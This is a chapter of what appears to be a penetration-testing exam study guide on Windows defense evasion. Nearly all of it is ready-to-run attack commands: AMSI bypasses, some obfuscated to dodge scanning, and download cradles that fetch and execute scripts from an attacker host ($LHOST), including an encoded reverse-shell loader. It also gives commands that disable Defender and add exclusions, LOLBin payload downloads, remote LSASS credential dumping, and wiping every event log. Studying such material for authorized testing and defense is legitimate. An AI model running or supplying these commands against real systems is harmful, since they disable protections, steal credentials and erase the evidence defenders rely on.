# 13 — Defense Evasion & AV Bypass

[← Back to index](README.md)

## 13.1 AMSI Bypass

AMSI (Antimalware Scan Interface) scans PowerShell/scripts before execution.

```powershell
# Method 1 — Memory patching (one-liner)
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Method 2 — Reflection (obfuscated)
$a=[Ref].Assembly.GetType('System.Management.Automation.Am'+'siUtils')
$b=$a.GetField('amsi'+'InitFailed','NonPublic,Static')
$b.SetValue($null,$true)

# Method 3 — Patching amsi.dll (needs admin)
# Use: https://github.com/rasta-mouse/AmsiScanBufferBypass

# Method 4 — PowerShell downgrade
powershell -version 2

# Method 5 — Environment variable
[Environment]::SetEnvironmentVariable('__PSLockDownPolicy', '8')
$env:COMPUTERNAME   # Check CLM status

# Test if AMSI is bypassed
Test-Path Variable:\amsiContext
```

## 13.2 PowerShell Execution Bypass

```powershell
# Execution policy bypass
powershell -ep bypass -c ". .\script.ps1"
powershell -ExecutionPolicy Bypass -File script.ps1
Set-ExecutionPolicy -Scope CurrentUser Bypass

# Constrained Language Mode (CLM) bypass
# Check CLM: $ExecutionContext.SessionState.LanguageMode
# Use a custom runspace:
$r = [runspacefactory]::CreateRunspace()
$r.Open()
$ps = [powershell]::Create()
$ps.Runspace = $r
$ps.AddScript('whoami').Invoke()

# Load script from memory (bypass script block logging detection)
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
IEX (New-Object Net.WebClient).DownloadString('http://$LHOST/PowerView.ps1')

# Cradle variations
iex(iwr http://$LHOST/script.ps1 -UseBasicParsing)
(New-Object System.Net.WebClient).DownloadFile('http://$LHOST/nc.exe','C:\Temp\nc.exe')

# Encode command
$cmd = 'IEX (New-Object Net.WebClient).DownloadString("http://$LHOST/rev.ps1")'
$bytes = [System.Text.Encoding]::Unicode.GetBytes($cmd)
$enc = [Convert]::ToBase64String($bytes)
powershell -enc $enc
```

## 13.3 Defender & EDR Evasion

```powershell
# Disable Windows Defender (requires admin)
Set-MpPreference -DisableRealtimeMonitoring $true
Set-MpPreference -DisableIOAVProtection $true
Set-MpPreference -DisableBehaviorMonitoring $true

# Add exclusions
Add-MpPreference -ExclusionPath 'C:\Temp'
Add-MpPreference -ExclusionProcess 'powershell.exe'

# Check Defender status
Get-MpComputerStatus
Get-MpPreference | Select-Object Disable*
```

```powershell
# LOLBins — live off the land
# Use built-in Windows tools instead of dropping malware
certutil.exe -urlcache -split -f http://$LHOST/file.exe file.exe
bitsadmin /transfer job /download /priority normal http://$LHOST/file.exe C:\Temp\file.exe
curl.exe -o C:\Temp\file.exe http://$LHOST/file.exe

# Obfuscated Mimikatz alternatives
#   Invoke-Mimikatz (PowerSploit)
#   SafetyKatz (minidump + offline parsing)
#   SharpKatz (C# port)
#   BetterSafetyKatz (AES encrypted)
```

## 13.4 OPSEC Considerations

```powershell
# Use AES Kerberos encryption instead of RC4 (less noisy)
.\Rubeus.exe asktgt /user:$USER /aes256:AES_KEY /opsec
```

```bash
impacket-getTGT $DOMAIN/$USER -aesKey AES256_KEY -dc-ip $DC_IP
```

```text
# Avoid common detection triggers:
#   - Mimikatz keyword in scripts/processes
#   - sekurlsa::logonpasswords (detected by many EDRs)
#   - 4624/4672 Event IDs (unusual admin logons)
#   - 4769 (Kerberos TGS request with RC4 encryption type = 0x17)
#   - 4768 (Kerberos TGT request with odd encryption)

# Use constrained delegation / RBCD instead of mimikatz where possible
# Use secretsdump over network (no local process injection)
# Use Rubeus /opsec flag for OPSEC-safe operations
```

```bash
# Remote Mimikatz (dumps LSASS remotely via WMI without dropping files)
crackmapexec smb TARGET -u $USER -p $PASS -M lsassy
crackmapexec smb TARGET -u $USER -p $PASS -M nanodump
```

```powershell
# Clear event logs (OPSEC cleanup — use carefully)
wevtutil cl Security
wevtutil cl System
wevtutil cl Application
wevtutil el | ForEach-Object {wevtutil cl $_}
```

---

[← Prev: 12 — Forest & Trust Attacks](12-forest-and-trust-attacks.md) | [Next: 14 — CAPE Exam Tips & Cheatsheet →](14-cape-exam-tips-and-cheatsheet.md)
